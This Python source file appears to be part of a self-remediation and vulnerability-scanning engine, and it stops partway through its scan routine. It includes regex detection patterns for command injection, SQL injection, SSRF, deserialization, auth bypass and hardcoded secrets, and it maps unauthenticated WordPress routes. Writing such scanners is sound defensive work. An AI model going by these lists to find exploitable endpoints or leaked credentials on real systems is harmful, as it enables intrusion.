"""
Universal Autonomous Error Analysis & Self-Remediation Engine.

Five core capabilities, each independently extensible:

  SourceCodeIntelligence   — understand code in any framework / language
  VulnerabilityIntelligence — detect security issues from code + behavior
  CveIntelligence          — reason about CVE descriptions, classify, map to attack surface
  DependencyAnalysis       — parse dependency manifests, detect vulnerable packages
  RemediationEngine        — DETECT → ANALYZE → DIAGNOSE → PROPOSE → VERIFY → CORRECT

Orchestrated by UniversalEngine. No hardcoded CVE IDs, no framework-specific rules:
all reasoning is driven by evidence from error signals, source code, and NVD data.
"""

from __future__ import annotations

import json
import os
import re
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Tuple


# ─────────────────────────── Core data types ──────────────────────────────────

class ErrorKind(Enum):
    VALIDATION  = auto()   # missing / invalid params, schema mismatch
    AUTH        = auto()   # 401/403, bad token, missing role
    NOT_FOUND   = auto()   # 404, unregistered route / resource
    SERVER      = auto()   # 500, fatal exception, process crash
    PROCESS     = auto()   # non-zero exit, signal, WP-CLI die()
    CONFIG      = auto()   # missing env-var, TLS, bad config
    DB          = auto()   # query failure, missing table, migration needed
    NETWORK     = auto()   # timeout, connection refused
    DEPENDENCY  = auto()   # missing class / module / import
    UNKNOWN     = auto()


@dataclass
class ErrorSignal:
    """Universal, format-agnostic error representation."""
    kind:     ErrorKind
    code:     str              # e.g. "rest_missing_callback_param", "403"
    message:  str
    source:   str              # "http_response" | "log" | "exit_code" | "exception"
    details:  Dict[str, Any] = field(default_factory=dict)
    raw:      Any = None       # original object (Response, exception, log line)

    @staticmethod
    def from_http(response: Any) -> Optional["ErrorSignal"]:
        """Parse an HTTP response into an ErrorSignal.
        Works for JSON (REST), XML (SOAP), plain-text, and HTML error pages."""
        if response is None:
            return None
        status = getattr(response, "status_code", 0)
        body = getattr(response, "text", "") or ""

        # Attempt JSON parse
        try:
            data = json.loads(body)
        except Exception:
            data = {}

        # Classify kind from status
        if status in (400, 422):
            kind = ErrorKind.VALIDATION
        elif status in (401, 403):
            kind = ErrorKind.AUTH
        elif status == 404:
            kind = ErrorKind.NOT_FOUND
        elif status >= 500:
            kind = ErrorKind.SERVER
        else:
            kind = ErrorKind.UNKNOWN

        # Extract code / message from common REST error formats
        code = (data.get("code") or data.get("error") or
                data.get("type") or str(status))
        message = (data.get("message") or data.get("msg") or
                   data.get("detail") or body[:200])
        details = data.get("data") or data.get("errors") or {}
        if isinstance(details, str):
            details = {"_raw": details}

        return ErrorSignal(kind=kind, code=str(code), message=str(message),
                           source="http_response", details=details, raw=response)

    @staticmethod
    def from_exit(returncode: int, stdout: str, stderr: str) -> "ErrorSignal":
        """Parse a subprocess result into an ErrorSignal."""
        combined = (stderr or "") + (stdout or "")
        # WP-CLI / generic process patterns
        if "does not exist" in combined and "cannot be registered" in combined:
            kind, code = ErrorKind.DEPENDENCY, "callable_not_registered"
        elif "TLS" in combined or "SSL" in combined or "certificate" in combined:
            kind, code = ErrorKind.CONFIG, "tls_error"
        elif "Fatal error" in combined or "Uncaught" in combined:
            kind, code = ErrorKind.SERVER, "php_fatal"
        elif returncode != 0:
            kind, code = ErrorKind.PROCESS, f"exit_{returncode}"
        else:
            kind, code = ErrorKind.UNKNOWN, "unknown_exit"

        return ErrorSignal(kind=kind, code=code, message=combined[:300],
                           source="exit_code", details={}, raw=(returncode, stdout, stderr))


@dataclass
class ParamDefinition:
    """What a framework knows about a parameter from its schema / source."""
    name:           str
    required:       bool          = False
    type_hint:      str           = "string"
    allowed_values: List[str]     = field(default_factory=list)
    pattern:        str           = ""
    description:    str           = ""
    language:       str           = "unknown"   # php | python | js | java | ruby | go


@dataclass
class RootCause:
    signal:     ErrorSignal
    hypothesis: str                        # human-readable explanation
    confidence: float                      # 0.0 – 1.0
    param_defs: List[ParamDefinition]      = field(default_factory=list)
    evidence:   List[str]                  = field(default_factory=list)


@dataclass
class Fix:
    description: str
    changes:     Dict[str, Any]   # param_name → value, or other keyed changes
    reversible:  bool = True
    rationale:   str  = ""


@dataclass
class RemediationResult:
    success:       bool
    attempts:      int
    fixes_applied: List[Fix]
    final_signal:  Optional[ErrorSignal]
    log:           List[str] = field(default_factory=list)


# ─────────────────────── 1. Source Code Intelligence ──────────────────────────

class _BaseExtractor:
    """Interface for per-language source-code extractors."""
    extensions: Tuple[str, ...] = ()

    def applicable(self, path: str) -> bool:
        return any(path.endswith(ext) for ext in self.extensions)

    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
        return []


class _PHPExtractor(_BaseExtractor):
    """PHP / WordPress REST API — register_rest_route args, validate_callback."""
    extensions = (".php",)
    _NEVER = {
        "required", "true", "false", "type", "string", "integer", "boolean",
        "array", "default", "description", "sanitize", "validate", "callback",
        "enum", "format", "email", "number", "null", "object", "function",
        "return", "echo", "public", "private", "protected", "static",
        "sanitize_text_field", "sanitize_email", "rest_sanitize_boolean",
        "sanitize_user", "esc_url_raw", "column", "table", "prefix",
    }

    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
        results = []
        # Match the param block: 'name' => [ ... ]
        for m in re.finditer(
            r"""['"]\s*""" + re.escape(param_name) + r"""\s*['"]\s*=>\s*\[(.{20,800}?)\]""",
            content, re.DOTALL
        ):
            block = m.group(1)
            required = bool(re.search(r"['\"]required['\"]\s*=>\s*true", block, re.I))
            type_hint = "string"
            for t in ("integer", "boolean", "array", "number"):
                if re.search(rf"['\"]type['\"]\s*=>\s*['\"]?{t}", block, re.I):
                    type_hint = t
                    break

            # Look for inline array of allowed values: ['a', 'b', 'c']
            allowed: List[str] = []
            # Pattern: in_array($x, ['a', 'b']) or just ['a', 'b'] near param block
            for arr_m in re.finditer(r"\[(['\"][a-zA-Z0-9_\-]+['\"](?:\s*,\s*['\"][a-zA-Z0-9_\-]+['\"])*)\]", block):
                vals = re.findall(r"['\"]([a-zA-Z0-9_\-]{2,30})['\"]", arr_m.group(1))
                good = [v for v in vals if v.lower() not in self._NEVER and not v.isdigit()]
                if good:
                    allowed = good
                    break

            # Also look for $allowed_types = ['a', 'b'] in a window that extends past the
            # matched block end (block may be truncated by an inner ']' in the closure).
            # We use a 400-char window starting from the block start, but require that the
            # variable assignment appears BEFORE the NEXT sibling param key ('other_param' =>).
            if not allowed:
                win_start = m.start()
                win_end   = min(len(content), win_start + len(block) + 200)
                # Restrict window to content before the next sibling param key at top level
                next_sibling = re.search(
                    r"""['"]\s*[a-zA-Z_][a-zA-Z0-9_]*\s*['"]\s*=>""",
                    content[m.end(): m.end() + 300]
                )
                if next_sibling:
                    win_end = min(win_end, m.end() + next_sibling.start())
                win = content[win_start:win_end]
                for arr_m in re.finditer(
                    r"\$\w*(?:type|kind|mode|value|option|status|role|method|provider|allow)\w*"
                    r"\s*=\s*\[(['\"][a-zA-Z0-9_\-]+['\"](?:\s*,\s*['\"][a-zA-Z0-9_\-]+['\"])*)\]",
                    win
                ):
                    vals = re.findall(r"['\"]([a-zA-Z0-9_\-]{2,30})['\"]", arr_m.group(1))
                    good = [v for v in vals if v.lower() not in self._NEVER and not v.isdigit()]
                    if good:
                        allowed = good
                        break

            results.append(ParamDefinition(
                name=param_name, required=required, type_hint=type_hint,
                allowed_values=allowed, language="php",
            ))
        return results


class _PythonExtractor(_BaseExtractor):
    """Python: FastAPI, Pydantic, Django REST Framework, Flask."""
    extensions = (".py",)

    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
        results = []
        # Pydantic / FastAPI: param_name: Literal["a", "b"] — anchored to the param name
        for m in re.finditer(
            re.escape(param_name) + r"""\s*:\s*(?:[A-Za-z_]+\s*\[)?Literal\[(['"a-zA-Z0-9_,\s]+)\]""",
            content
        ):
            vals = re.findall(r"""['"]([a-zA-Z0-9_\-]{2,30})['"]""", m.group(1))
            if vals:
                results.append(ParamDefinition(
                    name=param_name, required=True, type_hint="enum",
                    allowed_values=vals, language="python",
                ))
        # Django choices: look for the choices tuple/list near a field that names this param.
        # Anchor: find a CharField/ChoiceField that mentions param_name within 400 chars of CHOICES.
        for pname_m in re.finditer(re.escape(param_name), content, re.IGNORECASE):
            ctx = content[max(0, pname_m.start() - 50): pname_m.start() + 600]
            for m in re.finditer(
                r"""[A-Z_]+\s*=\s*\[((?:\s*\(['\"][a-zA-Z0-9_\-]+['"]\s*,.*?\)\s*,?\s*)+)\]""",
                ctx, re.DOTALL
            ):
                vals = re.findall(r"""\(\s*['"]([a-zA-Z0-9_\-]{2,30})['"]\s*,""", m.group(1))
                if vals:
                    results.append(ParamDefinition(
                        name=param_name, required=True, type_hint="enum",
                        allowed_values=vals, language="python",
                    ))
                    break
        return results


class _JavaScriptExtractor(_BaseExtractor):
    """Node.js / TypeScript: Zod, Joi, Express validator, OpenAPI."""
    extensions = (".js", ".ts", ".mjs", ".cjs")

    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
        results = []
        # For each occurrence of param_name in the file, check for schema patterns nearby.
        for pname_m in re.finditer(re.escape(param_name), content, re.IGNORECASE):
            ctx = content[pname_m.start(): pname_m.start() + 400]
            # Zod: param_name: z.enum(["a", "b"]) — colon + z.enum within 100 chars
            for m in re.finditer(r"z\.enum\(\s*\[([^\]]+)\]", ctx):
                vals = re.findall(r"""['"`]([a-zA-Z0-9_\-]{2,30})['"`]""", m.group(1))
                if vals:
                    results.append(ParamDefinition(
                        name=param_name, required=True, type_hint="enum",
                        allowed_values=vals, language="javascript",
                    ))
                    break
            # Joi: .valid('a', 'b') within 200 chars of param_name
            for m in re.finditer(r"""\.valid\(([^)]+)\)""", ctx):
                vals = re.findall(r"""['"`]([a-zA-Z0-9_\-]{2,30})['"`]""", m.group(1))
                if vals:
                    results.append(ParamDefinition(
                        name=param_name, required=True, type_hint="enum",
                        allowed_values=vals, language="javascript",
                    ))
                    break
        return results


class _GenericExtractor(_BaseExtractor):
    """Language-agnostic fallback: finds the param name as a KEY (followed by = or : or ()
    and looks for an array of string literals within 300 chars. Only triggers on key-value
    context to avoid cross-param contamination."""
    extensions = (".php", ".py", ".js", ".ts", ".rb", ".java", ".go", ".rs")

    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
        # Require param_name to appear as a key: name= / name: / name(
        for m in re.finditer(
            re.escape(param_name) + r"""\s*(?:=|:|\()""",
            content, re.IGNORECASE
        ):
            ctx = content[m.start(): m.start() + 300]
            for arr_m in re.finditer(
                r"""[\[(]['"` ]?([a-zA-Z0-9_\-]{2,20}['"`]\s*,\s*['"`]?[a-zA-Z0-9_\-]{2,20})['"` ]?\s*[\])]""",
                ctx
            ):
                vals = re.findall(r"""['"`]([a-zA-Z0-9_\-]{2,20})['"`]""", arr_m.group(0))
                if len(vals) >= 2:
                    return [ParamDefinition(
                        name=param_name, required=True, type_hint="enum",
                        allowed_values=vals, language="generic",
                    )]
        return []


class _JavaExtractor(_BaseExtractor):
    """Java Spring Boot / JAX-RS: @RequestParam, enum types, @Pattern."""
    extensions = (".java",)

    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
        results = []
        # @RequestParam("name") with Enum type or allowedValues
        for m in re.finditer(
            r'@RequestParam\s*(?:\([^)]*["\']' + re.escape(param_name) + r'["\']\s*[^)]*\))?'
            r'\s+\w+\s+' + re.escape(param_name),
            content
        ):
            ctx = content[max(0, m.start() - 50): m.start() + 400]
            em = re.search(r'\b([A-Z][A-Za-z0-9]+)\s+' + re.escape(param_name), ctx)
            if em:
                enum_type = em.group(1)
                for em2 in re.finditer(
                    r'enum\s+' + re.escape(enum_type) + r'\s*\{([^}]+)\}',
                    content, re.DOTALL
                ):
                    vals = re.findall(r'\b([A-Z][A-Z0-9_]{1,20})\b', em2.group(1))
                    vals = [v.lower() for v in vals
                            if v not in ('NULL', 'STATIC', 'FINAL', 'PRIVATE', 'PUBLIC', 'PROTECTED')]
                    if vals:
                        results.append(ParamDefinition(
                            name=param_name, required=True, type_hint="enum",
                            allowed_values=vals, language="java",
                        ))
        # allowedValues = {"a", "b"} annotation
        for m in re.finditer(
            re.escape(param_name) + r'[^;{]{0,100}allowedValues\s*=\s*\{([^}]+)\}',
            content, re.DOTALL
        ):
            vals = re.findall(r'"([a-zA-Z0-9_\-]{2,30})"', m.group(1))
            if vals:
                results.append(ParamDefinition(
                    name=param_name, required=True, type_hint="enum",
                    allowed_values=vals, language="java",
                ))
        return results


class _RubyExtractor(_BaseExtractor):
    """Ruby on Rails: validates inclusion, enum, strong parameters."""
    extensions = (".rb",)

    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
        results = []
        # validates :field, inclusion: { in: ["a", "b"] }
        for m in re.finditer(
            r'validates\s+:' + re.escape(param_name) +
            r'[^$\n]{0,100}?inclusion:\s*\{\s*in:\s*\[([^\]]+)\]',
            content, re.DOTALL
        ):
            vals = re.findall(r"""['"]([a-zA-Z0-9_\-]{2,30})['"]""", m.group(1))
            if vals:
                results.append(ParamDefinition(
                    name=param_name, required=True, type_hint="enum",
                    allowed_values=vals, language="ruby",
                ))
        # enum :field, { active: 0, inactive: 1 }  or  enum field: [:active, :inactive]
        for m in re.finditer(
            r'enum\s+:?' + re.escape(param_name) + r'\s*[,:]?\s*[\[{]([^\]}]+)[\]}]',
            content, re.DOTALL
        ):
            vals = re.findall(r'(?::|\b)([a-z][a-z0-9_]{1,20})\b', m.group(1))
            vals = [v for v in vals if v not in ('true', 'false', 'nil', 'null')]
            if vals:
                results.append(ParamDefinition(
                    name=param_name, required=True, type_hint="enum",
                    allowed_values=vals, language="ruby",
                ))
        return results


class _OpenAPIExtractor(_BaseExtractor):
    """OpenAPI / Swagger specs (yaml or json): parameter enum arrays."""
    extensions = (".yaml", ".yml", ".json")

    def find_param_defs(self, content: str, param_name: str) -> List[ParamDefinition]:
        results = []
        for m in re.finditer(
            r"""(?:name|in):\s*['"]?""" + re.escape(param_name) + r"""['"]?""",
            content, re.IGNORECASE
        ):
            ctx = content[m.start(): m.start() + 600]
            # YAML: enum:\n  - value
            em = re.search(r'enum:\s*\n((?:\s*-\s*[^\n]+\n){1,20})', ctx)
            if em:
                vals = re.findall(r'-\s*[\'"]?([a-zA-Z0-9_\-]{2,30})[\'"]?', em.group(1))
                if vals:
                    results.append(ParamDefinition(
                        name=param_name, required=False, type_hint="enum",
                        allowed_values=vals, language="openapi",
                    ))
                    continue
            # JSON: "enum": ["a", "b"]
            em2 = re.search(r'"enum"\s*:\s*\[([^\]]+)\]', ctx)
            if em2:
                vals = re.findall(r'"([a-zA-Z0-9_\-]{2,30})"', em2.group(1))
                if vals:
                    results.append(ParamDefinition(
                        name=param_name, required=False, type_hint="enum",
                        allowed_values=vals, language="openapi",
                    ))
        return results


class SourceCodeIntelligence:
    """
    Understands code in any language/framework.
    Extensible: register additional _BaseExtractor subclasses via add_extractor().
    """

    def __init__(self):
        self._extractors: List[_BaseExtractor] = [
            _PHPExtractor(),
            _PythonExtractor(),
            _JavaScriptExtractor(),
            _JavaExtractor(),
            _RubyExtractor(),
            _OpenAPIExtractor(),
            _GenericExtractor(),
        ]

    def add_extractor(self, extractor: _BaseExtractor) -> None:
        self._extractors.insert(-1, extractor)   # before GenericExtractor

    def find_param_definitions(
        self,
        source_dir: str,
        param_names: List[str],
        max_files: int = 500,
    ) -> Dict[str, ParamDefinition]:
        """Walk source_dir, run all applicable extractors, return best definitions."""
        results: Dict[str, ParamDefinition] = {}
        if not os.path.isdir(source_dir):
            return results

        file_count = 0
        for root, _dirs, files in os.walk(source_dir):
            for fname in files:
                if file_count >= max_files:
                    break
                fpath = os.path.join(root, fname)
                applicable = [e for e in self._extractors if e.applicable(fpath)]
                if not applicable:
                    continue
                try:
                    content = open(fpath, encoding="utf-8", errors="replace").read()
                except Exception:
                    continue
                file_count += 1

                for param in param_names:
                    if param in results and results[param].allowed_values:
                        continue   # already have a good definition
                    for extractor in applicable:
                        defs = extractor.find_param_defs(content, param)
                        for d in defs:
                            existing = results.get(param)
                            # Prefer defs with allowed_values over bare ones
                            if existing is None or (d.allowed_values and not existing.allowed_values):
                                results[param] = d
                                break

        return results

    def infer_valid_value(
        self,
        param_name: str,
        param_def: Optional[ParamDefinition] = None,
        error_message: str = "",
    ) -> str:
        """
        Return the most likely valid value for a parameter.
        Priority: (1) values extracted from error message, (2) first allowed value
        from source, (3) semantic default by param name.
        """
        # 1. Extract from error message: "Allowed types: google, apple"
        for pat in [
            r"(?:allowed\s+(?:types?|values?|options?)[:：]\s*)([a-z0-9_,\s\-]+)",
            r"(?:must\s+be\s+one\s+of[:：]\s*)([a-z0-9_,\s\-]+)",
            r"(?:valid\s+(?:types?|values?)[:：]\s*)([a-z0-9_,\s\-]+)",
            r"(?:accepted\s+(?:types?|values?)[:：]\s*)([a-z0-9_,\s\-]+)",
        ]:
            m = re.search(pat, error_message, re.IGNORECASE)
            if m:
                vals = [v.strip() for v in m.group(1).split(",") if v.strip()]
                if vals:
                    return vals[0]

        # 2. First allowed value from source code analysis
        if param_def and param_def.allowed_values:
            return param_def.allowed_values[0]

        # 3. Semantic defaults keyed by param-name patterns
        lp = param_name.lower()
        if any(x in lp for x in ("token", "access_token", "access", "secret",
                                   "password", "pass", "pwd", "credential", "key")):
            return "binoracle_lab_token"
        if any(x in lp for x in ("type", "kind", "mode", "method", "provider",
                                   "platform", "source", "action", "login_type")):
            return "default"
        if any(x in lp for x in ("role", "permission", "level", "scope")):
            return "subscriber"
        if any(x in lp for x in ("id", "user_id", "uid", "identifier")):
            return "1"
        if any(x in lp for x in ("name", "username", "login", "user")):
            return "binoracle_user"
        return "binoracle_test"


# ──────────────────── 2. Vulnerability Intelligence ───────────────────────────

@dataclass
class SecurityFinding:
    vuln_class:  str         # "auth_bypass", "sqli", "idor", "xss", …
    description: str
    evidence:    List[str]
    confidence:  float       # 0.0 – 1.0
    location:    str = ""    # file:line or endpoint
    route:       str = ""    # HTTP route path when vuln is a registered endpoint


class VulnerabilityIntelligence:
    """
    Identifies security issues from source code patterns and HTTP behavior.
    Evidence-based: each finding needs at least one concrete code evidence item.
    No theoretical impact, no speculation.

    Detection modes:
      auth_sequence  — set_auth BEFORE role/permission check (requires both patterns, ordered)
      sink           — dangerous function call without nearby mitigation in a 600-char window
      public_ep      — endpoint registered with no auth requirement
      hardcoded      — literal secret/credential embedded in code
    """

    # ── 1. Auth-before-role-check sequences ─────────────────────────────────────
    _AUTH_BEFORE_CHECK: List[Tuple[str, str, str]] = [
        (r"wp_set_auth_cookie|wp_set_current_user",
         r"has_role|in_array.*role|current_user_can|getPatientRole|user_role",
         "auth_bypass_cookie_before_role_check"),
        (r"session\[.user.\]\s*=|login_user\(",
         r"has_permission|check_permission|require_permission|@login_required",
         "auth_bypass_session_before_permission"),
        (r"jwt\.sign\(|create_access_token\(|generate_token\(",
         r"require.*role|check.*permission|authorize\(",
         "auth_bypass_token_before_role"),
    ]

    # ── 2. Missing-auth public endpoints ────────────────────────────────────────
    _PUBLIC_ENDPOINT_PATTERNS: List[Tuple[str, str]] = [
        (r"permission_callback.*__return_true|'permission_callback'\s*=>\s*'__return_true'",
         "wp_rest_no_auth_required"),
        (r"register_rest_route[^;]{0,300}'permission_callback'\s*=>\s*function[^{]{0,20}\{\s*return\s*true",
         "wp_rest_always_true_callback"),
        (r"@app\.route[^@\n]{0,80}\n(?:(?!@login_required)[^\n]+\n){0,3}def ",
         "flask_unprotected_route"),
        (r'@PostMapping|@GetMapping|@RequestMapping(?!.*@PreAuthorize|.*@Secured)',
         "spring_unprotected_mapping"),
    ]

    # ── 3. Sink patterns (vuln_pattern, mitigation_in_window, vuln_class) ────────
    _SINK_PATTERNS: List[Tuple[str, str, str]] = [
        # SQL injection — PHP string concatenation into query
        (r'(?:mysql_query|mysqli_query|->query|->prepare)\s*\(\s*["\'][^"\']{0,80}["\'\s]*\.'
         r'\s*\$(?:_GET|_POST|_REQUEST|_COOKIE|\w+)',
         r'mysqli_real_escape_string|addslashes|prepare\s*\([^)]*\?|->prepare\s*\(',
         "sqli_string_concat_php"),
        # SQL injection — Python f-string or % format in cursor.execute
        (r'cursor\.execute\s*\(\s*(?:f["\']|["\'][^"\']*%s[^"\']*["\']?\s*%\s*\()',
         r'cursor\.execute\s*\(\s*["\'][^"\']*\?[^"\']*["\']',
         "sqli_format_string_python"),
        # XSS — PHP echo unsanitized user input
        (r'echo\s+\$_(?:GET|POST|REQUEST|COOKIE)\s*\[',
         r'htmlspecialchars|htmlentities|esc_html|esc_attr|wp_kses',
         "xss_reflected_php"),
        # XSS — PHP print_r / var_dump of user input
        (r'(?:print_r|var_dump)\s*\(\s*\$_(?:GET|POST|REQUEST)',
         r'htmlspecialchars|htmlentities',
         "xss_debug_output_php"),
        # XSS — JS innerHTML with dynamic content
        (r'\.innerHTML\s*=\s*(?!`[^`]*`\s*;)[^\n;]{0,80}(?:req|request|param|query|data)',
         r'DOMPurify\.sanitize|\.textContent\s*=|createTextNode',
         "xss_dom_innerHTML"),
        # Command injection — PHP shell functions with user input
        (r'(?:system|exec|shell_exec|passthru|popen)\s*\(\s*(?:\$_(?:GET|POST|REQUEST)|'
         r'\$\w+\s*=\s*\$_(?:GET|POST|REQUEST))',
         r'escapeshellarg|escapeshellcmd',
         "command_injection_php"),
        # Command injection — Python subprocess with shell=True
        (r'subprocess\.(?:run|call|Popen|check_output)\s*\([^)]{0,200}shell\s*=\s*True',
         r'shlex\.quote|shlex\.split\(',
         "command_injection_python_subprocess"),
        # Path traversal — PHP file functions with user input
        (r'(?:file_get_contents|readfile|include|require|fopen)\s*\(\s*\$_(?:GET|POST|REQUEST)',
         r'realpath|basename|ABSPATH|WP_PLUGIN_DIR|sanitize_file_name',
         "path_traversal_php"),
        # Path traversal — Python open() with user-controlled path
        (r'open\s*\(\s*(?:request\.|g\.|f["\'].*\{|os\.path\.join\s*\([^)]*request\.)',
         r'os\.path\.realpath|os\.path\.abspath|safe_join|\.startswith\(',
         "path_traversal_python"),
        # PHP deserialization
        (r'unserialize\s*\(\s*\$_(?:GET|POST|REQUEST|COOKIE|SESSION)',
         r'',
         "deserialization_php_user_input"),
        # Python pickle with user data
        (r'pickle\.loads\s*\(|pickle\.load\s*\([^\n]{0,80}(?:request|user|body|data)',
         r'',
         "deserialization_python_pickle"),
        # SSRF — PHP curl/file_get_contents with user-controlled URL
        (r'(?:curl_init|file_get_contents|curl_setopt[^;]{0,30}CURLOPT_URL)\s*\('
         r'\s*\$_(?:GET|POST|REQUEST)',
         r'filter_var[^;]{0,80}FILTER_VALIDATE_URL|FILTER_FLAG_NO_PRIV_RANGE|'
         r'gethostbyname|parse_url',
         "ssrf_php"),
        # SSRF — Python requests with user URL
        (r'requests\.(?:get|post|put|patch|head)\s*\(\s*(?:request\.|url\s*=\s*request\.)',
         r'ipaddress\.ip_address|urllib\.parse\.urlparse|allowlist|is_safe_url',
         "ssrf_python_requests"),
        # File upload without extension check
        (r'move_uploaded_file\s*\(',
         r'\$(?:allowed_ext|allowed_type|whitelist|valid_ext)\s*=\s*\[|'
         r'in_array\s*\(\s*\$(?:ext|type|mime)',
         "file_upload_no_extension_check"),
        # Weak crypto — MD5/SHA1 for passwords
        (r'(?:md5|sha1)\s*\(\s*\$(?:password|pass|pwd|passwd)',
         r'password_hash|bcrypt|argon2|sodium_crypto',
         "weak_hash_password_php"),
        # Weak crypto — rand() for security tokens
        (r'(?:rand|mt_rand)\s*\(\)[^;]{0,100}(?:token|secret|nonce|key|csrf)',
         r'random_bytes|openssl_random_pseudo_bytes|wp_generate_password',
         "weak_prng_for_token_php"),
    ]

    # ── 4. Hardcoded secrets ─────────────────────────────────────────────────────
    # Require the value to look like a real secret: ≥16 chars, not a PHP/JS variable ($x, x=)
    # and not a bare identifier (letters only). Excludes `token=` in URL construction.
    _HARDCODED_PATTERNS: List[Tuple[str, str]] = [
        # password/secret/api_key = "real-looking-value" (not a variable, not a template)
        (r"""(?:password|passwd|pwd|secret_key|api_key|apikey|private_key|auth_secret)\s*[=:]\s*['"][A-Za-z0-9!@#$%^&*\-_+/]{16,100}['"]""",
         "hardcoded_credential"),
        # OpenAI / Stripe / GitHub PAT key patterns
        (r"""(?:sk-[A-Za-z0-9]{20,}|ghp_[A-Za-z0-9]{20,}|pk_live_[A-Za-z0-9]{20,}|xox[bpoa]-[A-Za-z0-9\-]{20,})""",
         "hardcoded_api_key"),
        # DB connection string with credentials
        (r"""(?:mysql|postgresql|postgres|mongodb)://[A-Za-z0-9_\-]{3,}:[A-Za-z0-9!@#$%^&*]{3,}@""",
         "hardcoded_db_connection_string"),
        # Private key block
        (r"""-----BEGIN (?:RSA |EC )?PRIVATE KEY-----""",
         "embedded_private_key"),
    ]

    # Directories to skip entirely for sink/XSS scanning (minified/bundled JS)
    _SKIP_DIRS = frozenset((
        "node_modules", ".git", "vendor", "__pycache__", ".venv", "venv",
        "dist", "build", "public/assets", "assets",
    ))
    # File name patterns that indicate minified/compiled JS (skip innerHTML detection)
    _MINIFIED_JS_RE = re.compile(r'[-.]min\.js$|[-.]bundle\.js$|[-\.]chunk\.js$')

    def _is_minified(self, fpath: str) -> bool:
        """True for minified/bundled JS files where innerHTML findings are almost always FP."""
        fname = os.path.basename(fpath)
        if self._MINIFIED_JS_RE.search(fname):
            return True
        # Heuristic: single-line JS file longer than 2000 chars
        try:
            with open(fpath, encoding="utf-8", errors="replace") as f:
                first = f.read(4000)
            if "\n" not in first[:3000] and len(first) >= 3000:
                return True
        except Exception:
            pass
        return False

    def scan_for_vulnerabilities(
        self,
        source_dir: str,
        max_files: int = 500,
    ) -> List[SecurityFinding]:
        """
        Comprehensive scan: auth-sequence, public-endpoint, sink, hardcoded-secrets.
        Returns findings sorted by confidence descending, deduplicated by vuln_class+location.
        """
        findings: List[SecurityFinding] = []
        if not os.path.isdir(source_dir):
            return findings

        source_exts = (".php", ".py", ".js", ".ts", ".java", ".rb", ".go", ".rs")
        file_count = 0
        for root, dirs, files in os.walk(source_dir):
            # Prune dirs that contain only build/vendor artefacts
            dirs[:] = [d for d in dirs if d not in self._SKIP_DIRS]
            for fname in files:
                if file_count >= max_files:
                    break
                if not any(fname.endswith(e) for e in source_exts):
                    continue
                fpath = os.path.join(root, fname)
                rel = os.path.relpath(fpath, source_dir)
                is_minified = self._is_minified(fpath)
                try:
                    content = open(fpath, encoding="utf-8", errors="replace").read()
                except Exception:
                    continue
                file_count += 1

                # Mode 1: auth-before-role-check
                for set_pat, check_pat, vuln_class in self._AUTH_BEFORE_CHECK:
                    m_set   = re.search(set_pat, content, re.I)
                    m_check = re.search(check_pat, content, re.I)
                    if m_set and m_check and m_set.start() < m_check.start():
                        findings.append(SecurityFinding(
                            vuln_class=vuln_class,
                            description=(
                                f"Auth set at offset {m_set.start()} before "
                                f"role/permission check at offset {m_check.start()}"
                            ),
                            evidence=[
                                f"{rel}:{content[:m_set.start()].count(chr(10))+1}: "
                                f"`{content[m_set.start():m_set.end()]!r}` precedes "
                                f"`{content[m_check.start():m_check.end()]!r}`"
                            ],
                            confidence=0.88,
                            location=rel,
                        ))

                # Mode 2: public endpoints — extract REST route or AJAX action
                # Pattern A: register_rest_route('ns/v1', '/path', [...])  — both strings
                _rr_literal = re.compile(
                    r"register_rest_route\s*\(\s*['\"]([^'\"]+)['\"]\s*,"
                    r"\s*['\"]([^'\"]{1,80})['\"]",
                    re.I,
                )
                # Pattern B: register_rest_route( $var, '/path', [...])  — variable ns + string path
                _rr_varns = re.compile(
                    r"register_rest_route\s*\(\s*\$[A-Za-z_>:\-]+\s*,"
                    r"\s*['\"]([^'\"]{1,80})['\"]",
                    re.I,
                )
                # Pattern C: wp_ajax_nopriv_<action_name>  — public AJAX handler
                _ajax_public = re.compile(
                    r"add_action\s*\(\s*['\"]wp_ajax_nopriv_([A-Za-z0-9_]+)['\"]",
                    re.I,
                )
                # Namespace hints: $this->namespace = 'ns/v1' or define('NS', 'ns/v1')
                _ns_re = re.compile(
                    r"(?:namespace\s*=\s*['\"]([^'\"]{3,40})['\"]"
                    r"|define\s*\(\s*['\"][A-Z_]+['\"],\s*['\"]([A-Za-z0-9_/-]{3,30})['\"])",
                    re.I,
                )
                for pat, vuln_class in self._PUBLIC_ENDPOINT_PATTERNS:
                    for m in re.finditer(pat, content, re.I | re.DOTALL):
                        snippet = content[m.start(): m.start() + 120].replace("\n", " ")
                        # Search window: 1.5 kB before + 50 chars after the match
                        win = content[max(0, m.start() - 1500): m.start() + 50]
                        route_str = ""

                        # Try literal namespace + path first
                        for rm in _rr_literal.finditer(win):
                            ns = rm.group(1).strip("/")
                            path = rm.group(2).strip("/")
                            route_str = f"/wp-json/{ns}/{path}"

                        # Try variable namespace + string path
                        if not route_str:
                            for rm in _rr_varns.finditer(win):
                                raw_path = rm.group(1).lstrip("/")
                                # Try to find a namespace hint in the same window
                                ns = ""
                                for nm in _ns_re.finditer(win):
                                    ns = (nm.group(1) or nm.group(2) or "").strip("/")
                                    break
                                if ns:
                                    route_str = f"/wp-json/{ns}/{raw_path}"
                                else:
                                    route_str = f"/wp-json/<ns>/{raw_path}"

                        # Try AJAX action — different mechanism from REST
                        if not route_str:
                            for am in _ajax_public.finditer(win):
                                action = am.group(1)
                                route_str = f"/wp-admin/admin-ajax.php?action={action}"
                                break

                        findings.append(SecurityFinding(
                            vuln_class=vuln_class,
                            description="Endpoint registered with no authentication requirement",
                            evidence=[
                                f"{rel}: `{snippet}`",
                                *([ f"route: {route_str}" ] if route_str else []),
                            ],
                            confidence=0.72,
                            location=rel,
                            route=route_str,
                        ))

                # Mode 3: sinks without mitigation
                # Skip innerHTML XSS detection in minified/bundled JS (too many FP)
                active_sinks = [
                    (sp, mp, vc) for sp, mp, vc in self._SINK_PATTERNS
                    if not (is_minified and vc == "xss_dom_innerHTML")
                ]
